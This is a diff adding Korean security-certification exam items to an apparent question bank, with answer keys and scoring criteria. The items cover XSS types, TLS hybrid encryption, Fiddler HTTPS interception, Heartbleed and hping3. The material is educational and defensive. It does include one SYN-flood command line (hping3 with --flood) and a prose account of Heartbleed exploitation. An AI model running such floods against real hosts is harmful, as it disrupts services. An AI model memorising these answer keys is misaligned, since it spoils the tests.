+    score: 14,
+    domain: "애플리케이션 보안",
+    title: "XSS (저장형 Stored vs 반사형 Reflected vs DOM 기반) 메커니즘 심층 비교",
+    description:
+      "웹 애플리케이션의 대표적인 취약점인 Cross-Site Scripting (XSS)의 3가지 유형에 대한 동작 메커니즘과 공격 전파 경로의 기술적 차이점을 상세히 비교 서술하시오.",
+    subItems: [
+      {
+        number: 1,
+        question:
+          "저장형 XSS (Stored XSS)의 동작 원리, 스크립트의 저장 위치, 공격 피해 대상의 특징을 서술하시오.",
+        answer:
+          "공격자가 입력한 악성 스크립트가 게시판, 댓글, 회원정보 등 웹 서버의 영구 데이터베이스(DB)에 저장된다. 이후 해당 게시물을 조회하는 불특정 다수의 희생자 브라우저로 스크립트가 전달되어 렌더링되면서 자동 실행되므로, 단 한 번의 공격으로 다수의 무작위 희생자에게 지속적인 피해를 유발한다.",
+        scoringCriteria: "서버 DB 저장, 불특정 다수 지속 피해 서술 시 5점",
+      },
+      {
+        number: 2,
+        question:
+          "반사형 XSS (Reflected XSS)의 동작 원리, 스크립트 전달 경로, 공격 유도 방식을 서술하시오.",
+        answer:
+          "악성 스크립트가 서버 DB에 저장되지 않고, URL 파라미터나 검색어 입력값 등에 포함되어 서버로 전송된 후 서버의 응답 웹 페이지에 즉시 반사(Reflect)되어 출력된다. 공격자는 피싱 메일, SNS 등에 악성 파라미터가 포함된 링크를 심어두고 희생자가 이를 클릭하도록 유도해야 공격이 성립한다.",
+        scoringCriteria: "서버 미저장/URL 반사, 링크 클릭 유도 단발성 피해 서술 시 4.5점",
+      },
+      {
+        number: 3,
+        question:
+          "DOM 기반 XSS (DOM-based XSS)의 동작 원리와, 서버와의 통신 관점에서 다른 두 XSS와의 결정적 차이점을 서술하시오.",
+        answer:
+          "악성 스크립트가 웹 서버로 전송되어 HTML 응답에 포함되는 것이 아니라, 브라우저 로컬에서 실행되는 자바스크립트가 URL 프래그먼트(`#`, `document.location`) 등의 입력값을 검증 없이 읽어 DOM(Document Object Model) 트리에 직접 삽입(`innerHTML`, `document.write`)할 때 발생한다. 서버의 웹 로그나 WAF 탐지 장비에 페이로드가 남지 않을 수 있다는 점이 결정적 차이다.",
+        scoringCriteria: "서버 미전송/브라우저 로컬 DOM 조작, 서버 로그/WAF 미탐지 특성 서술 시 4.5점",
+      },
+    ],
+    answer: [
+      "1. 저장형: 악성 스크립트가 서버 DB에 영구 저장 ➔ 게시물 열람하는 불특정 다수 지속 감염",
+      "2. 반사형: 악성 스크립트가 URL 파라미터로 즉시 반사 ➔ 조작된 링크를 클릭한 특정 희생자 단발 감염",
+      "3. DOM 기반: 서버를 거치지 않고 브라우저 클라이언트 JS가 DOM 트리를 직접 조작하여 실행",
+    ],
+    scoringPoints: [
+      "저장형 원리 및 DB 저장/불특정 다수 피해 명시 (5점)",
+      "반사형 원리 및 파라미터 반사/링크 클릭 유도 명시 (4.5점)",
+      "DOM 기반 원리 및 클라이언트 DOM 조작/서버 비통신 명시 (4.5점)",
+    ],
+    explanation:
+      "• XSS 방어 표준:\n입·출력값에 대한 HTML Entity 치환(`<` ➔ `&lt;`, `>` ➔ `&gt;`), CSP(Content Security Policy) 헤더 설정, 세션 쿠키 탈취 방지를 위한 `HttpOnly` 플래그 부여가 필수적입니다.",
+    examTips:
+      "2026년 1회차 실기 서술형 14번 기출입니다. 세 유형의 '저장 위치', '서버 통신 유무', '공격 전달 방식'을 명확히 대조해야 만점을 받습니다.",
+  },
+
+  // =================================================================
+  // [문제 143] 서술·실무형 (14점) - 정보보안 일반 & 암호학 (2026년 1회차 실기 기출)
+  // =================================================================
+  {
+    id: 143,
+    subjectId: "general",
+    type: "descriptive",
+    score: 14,
+    domain: "정보보안 일반 & 암호학",
+    title: "SSL/TLS 연결 설정 시 비대칭키와 대칭키 암호화의 역할 및 하이브리드 메커니즘",
+    description:
+      "HTTPS를 지원하는 SSL/TLS 핸드셰이크 및 통신 과정에서 비대칭키(공개키) 암호화와 대칭키 암호화가 각각 어느 단계에서 어떤 목적으로 사용되는지 구체적으로 서술하고, 두 암호 방식을 혼합 사용하는 기술적 이유를 기술하시오.",
+    subItems: [
+      {
+        number: 1,
+        question:
+          "SSL/TLS 핸드셰이크 단계에서 비대칭키(공개키) 암호화가 수행하는 2가지 핵심 역할과 사용되는 키를 서술하시오.",
+        answer:
+          "1. 서버 신원 인증: 서버가 제출한 X.509 인증서의 전자서명을 CA의 공개키로 검증하여 피싱/위장 서버가 아님을 확인한다.\n2. 세션키 교환/공유: 클라이언트가 생성한 사전 마스터 비밀값(Pre-master Secret)을 서버의 공개키로 암호화하여 전송함으로써(또는 ECDHE 키 교환 서명 검증), 도청자에게 노출되지 않고 안전하게 대칭 세션키를 공유한다.",
+        scoringCriteria: "서버 신원 인증(3.5점), 세션키/Pre-master Secret 안전 교환(3.5점) -> 총 7점",
+      },
+      {
+        number: 2,
+        question:
+          "핸드셰이크 완료 후 데이터 전송 단계에서 대칭키 암호화가 사용되는 목적과, 비대칭키만으로 전체 통신을 암호화하지 않고 하이브리드 암호 방식을 채택하는 이유를 서술하시오.",
+        answer:
+          "• 대칭키 목적: 핸드셰이크에서 생성된 대칭 세션키(AES, ChaCha20 등)를 사용하여 클라이언트와 서버 간 전송되는 실제 응용 데이터(Application Data)를 고속으로 암·복호화하여 통신 기밀성을 보장한다.\n• 하이브리드 채택 이유: 비대칭키(공개키) 암호화는 복잡한 수학적 연산으로 인해 대칭키 대비 암·복호화 속도가 수백~수천 배 느리다. 따라서 안전한 키 교환에만 공개키를 쓰고, 대용량 실제 데이터 전송에는 연산 속도가 극히 빠른 대칭키를 결합하여 성능과 보안을 모두 만족시킨다.",
+        scoringCriteria: "실제 응용 데이터 고속 암복호화 명시(3.5점), 연산 오버헤드 속도 차이에 따른 하이브리드 이유 명시(3.5점) -> 총 7점",
+      },
+    ],
+    answer: [
+      "1. 비대칭키(공개키): 핸드셰이크 단계에서 서버 인증서 검증(신원 인증) 및 Pre-master Secret 세션키 암호화 교환",
+      "2. 대칭키: 데이터 전송 단계에서 실제 웹 응용 데이터(Application Data)를 초고속 암·복호화",
+      "3. 하이브리드 채택 이유: 공개키 암호의 극심한 연산 부하를 회피하고 대칭키의 고속 처리 성능을 융합",
+    ],
+    scoringPoints: [
+      "비대칭키의 신원 인증 및 세션키 교환 목적 (7점)",
+      "대칭키의 응용 데이터 암호화 및 연산 속도 최적화(하이브리드) 이유 (7점)",
+    ],
+    explanation:
+      "• 하이브리드 암호 시스템 (Hybrid Cryptosystem):\n공개키 암호의 '키 분배 편의성'과 대칭키 암호의 '고속 데이터 처리 능력'을 결합한 가장 표준적인 엔터프라이즈 보안 아키텍처입니다.",
+    examTips:
+      "2026년 1회차 실기 서술형 15번 기출입니다. 핸드셰이크와 레코드 계층의 사용 알고리즘 분리를 명확히 기재하세요.",
+  },
+
+  // =================================================================
+  // [문제 144] 서술·실무형 (14점) - 애플리케이션 보안 (2026년 1회차 실기 기출)
+  // =================================================================
+  {
+    id: 144,
+    subjectId: "application",
+    type: "descriptive",
+    score: 14,
+    domain: "애플리케이션 보안",
+    title: "Fiddler 웹 프록시 분석 환경에서의 HTTPS 복호화 원리 및 XSS 방어 실무",
+    description:
+      "웹 취약점 진단 도구인 Fiddler 프록시를 이용해 웹 애플리케이션을 점검하는 상황이다. HTTPS 통신 분석 및 탐지된 XSS 취약점 대응에 관한 물음에 답하시오.",
+    subItems: [
+      {
+        number: 1,
+        question:
+          "Fiddler를 프록시로 설정했을 때 기본 상태에서 HTTPS 트래픽의 HTTP 요청/응답 본문(Body)이 평문으로 복호화되지 않는 기술적 원인을 서술하시오.",
+        answer:
+          "HTTPS는 클라이언트와 목적지 웹 서버 간 종단 간(End-to-End) TLS 암호화 세션이 체결되므로 중간 프록시는 암호화된 터널(CONNECT 터널)만 중계할 뿐 암호문 평문을 해독할 수 없기 때문이다.",
+        scoringCriteria: "종단 간 TLS 암호화 세션 체결로 중간 복호화 불가 명시 시 4점",
+      },
+      {
+        number: 2,
+        question:
+          "Fiddler에서 HTTPS 트래픽의 본문을 복호화하여 취약점을 점검하기 위해 클라이언트 OS/브라우저에 취해야 하는 필수 조치 사항 2가지를 서술하시오.",
+        answer:
+          "1. Fiddler 옵션에서 `Decrypt HTTPS traffic`(HTTPS 트래픽 복호화) 기능을 활성화한다.\n2. Fiddler가 동적으로 발급한 사설 루트 CA 인증서(DO_NOT_TRUST_FiddlerRoot)를 클라이언트 OS 및 브라우저의 **'신뢰할 수 있는 루트 인증 기관(Trusted Root Certification Authorities)'** 저장소에 설치·신뢰하도록 등록한다.",
+        scoringCriteria: "Decrypt HTTPS traffic 활성화(2.5점), 사설 루트 CA 인증서를 신뢰할 수 있는 루트 기관에 설치(2.5점) -> 총 5점",
+      },
+      {
+        number: 3,
+        question:
+          "진단 과정에서 발견된 XSS 취약점을 원천 방어하기 위해 웹 개발자가 소스코드 단에서 취해야 할 2대 핵심 보안 코딩 조치를 기술하시오.",
+        answer:
+          "1. 입·출력값에 대한 HTML 특수문자 치환(HTML Entity Encoding): 사용자가 입력한 데이터가 브라우저에 렌더링될 때 `<`, `>`, `\"`, `'`, `&` 등의 문자를 `&lt;`, `&gt;`, `&quot;` 등으로 이스케이프 처리한다.\n2. 세션 쿠키의 `HttpOnly` 속성 설정: 세션 ID나 토큰을 담고 있는 쿠키에 `HttpOnly` 플래그를 설정하여 악성 스크립트(`document.cookie`)에 의한 세션 탈취를 원천 차단한다.",
+        scoringCriteria: "HTML Entity 치환/Escape(2.5점), 세션 쿠키 HttpOnly 플래그 설정(2.5점) -> 총 5점",
+      },
+    ],
+    answer: [
+      "1. 미복호화 원인: 클라이언트와 서버 간 종단 간 TLS 암호화 터널 체결",
+      "2. 클라이언트 조치: Fiddler 'Decrypt HTTPS traffic' 활성화 및 사설 루트 CA를 '신뢰할 수 있는 루트 인증 기관'에 설치",
+      "3. XSS 방어: HTML Entity 이스케이프 치환 및 세션 쿠키 'HttpOnly' 속성 부여",
+    ],
+    scoringPoints: [
+      "종단 간 암호화 원인 (4점)",
+      "루트 CA 설치 및 Decrypt HTTPS 활성화 (5점)",
+      "HTML Entity 치환 및 HttpOnly 쿠키 속성 (5점)",
+    ],
+    explanation:
+      "• 프록시 MITM 원리:\nFiddler는 클라이언트에게는 자신이 진짜 웹 서버인 것처럼 위조 인증서를 제시하고, 서버와는 자신이 클라이언트인 것처럼 별도 연결을 맺는 중간자(Man-in-the-Middle) 공격 방식으로 동작합니다. 클라이언트가 사설 루트 CA를 신뢰하지 않으면 경고창이 뜨며 통신이 차단됩니다.",
+    examTips:
+      "2026년 1회차 실기 서술형 16번 기출입니다. Fiddler/Burp Suite의 HTTPS 프록시 인증서 설치 원리와 XSS 표준 방어책을 세트로 정리하세요.",
+  },
+
+  // =================================================================
+  // [문제 145] 단답형 (3점) - 애플리케이션 보안 (2026년 2회차 실기 보강)
+  // =================================================================
+  {
+    id: 145,
+    subjectId: "application",
+    type: "short",
+    score: 3,
+    domain: "애플리케이션 보안",
+    title: "OpenSSL TLS Heartbeat 메모리 누출 취약점 - 하트블리드 (Heartbleed)",
+    description:
+      "OpenSSL 암호화 라이브러리의 TLS/DTLS Heartbeat 확장 기능 구현 오류로 인해 발생한 취약점이다. 공격자가 요청 페이로드의 길이 필드를 악의적으로 조작하여 전송할 경우 서버가 바운드 검사(Bound Check)를 수행하지 않아 프로세스 메모리 데이터(최대 64KB)를 인증 없이 반복적으로 평문 탈취할 수 있었던 CVE-2014-0160 취약점의 명칭은?",
+    answer: ["하트블리드 (Heartbleed)"],
+    scoringPoints: ["하트블리드 (또는 Heartbleed) 기재 시 3점"],
+    explanation:
+      "• 하트블리드 (Heartbleed, CVE-2014-0160):\n클라이언트가 'Heartbeat Request'를 보낼 때 실제 페이로드 길이는 1바이트인데 길이 필드에 65535(64KB)를 선언하면, OpenSSL 엔진이 검증 없이 메모리에서 요청된 길이만큼 복사해 응답(Buffer Over-read)하면서 메모리에 남아 있던 사용자의 비밀번호, 개인키, 세션 토큰이 유출된 대표적인 버퍼 오버리드 취약점입니다.",
+    examTips:
+      "2026년 2회차 실기 단답형 기출입니다. 버퍼 오버플로우와 대조되는 버퍼 오버리드(Buffer Over-read)의 대표 사례입니다.",
+  },
+
+  // =================================================================
+  // [문제 146] 단답형 (3점) - 네트워크 보안 (2026년 2회차 실기 보강)
+  // =================================================================
+  {
+    id: 146,
+    subjectId: "network",
+    type: "short",
+    score: 3,
+    domain: "네트워크 보안",
+    title: "TCP/IP 패킷 조작 및 맞춤형 DoS/방화벽 테스팅 CLI 도구 hping3",
+    description:
+      "TCP, UDP, ICMP 등 다양한 프로토콜의 패킷 헤더, 소스 IP, 포트 번호, TCP 플래그(SYN, FIN, ACK 등)를 임의로 조작·생성하여 방화벽 규칙 검사, MTU 탐색, 포트 스캔 및 모의 서비스 거부(DoS) 공격 테스트에 널리 사용되는 CLI 네트워크 패킷 생성 도구의 명칭은?",
+    answer: ["hping (또는 hping3)"],
+    scoringPoints: ["hping 또는 hping3 기재 시 3점"],
+    explanation:
+      "• `hping3`:\n단순한 핑(Ping) 명령을 넘어 TCP SYN 플래그를 설정한 패킷(`hping3 -S -p 80 --flood`)을 대량 전송하여 SYN 플러딩 공격을 시뮬레이션하거나, 방화벽의 ACL 룰셋이 특정 패킷을 정상 차단하는지 검증할 수 있는 강력한 패킷 분석·제작 CLI 도구입니다.",
+    examTips:
+      "2026년 2회차 실기 단답형 기출입니다. 패킷 캡처 도구(tcpdump, Wireshark)와 패킷 생성 도구(hping3, Scapy)의 분류를 기억하세요.",
+  },
 ];
+
 
 
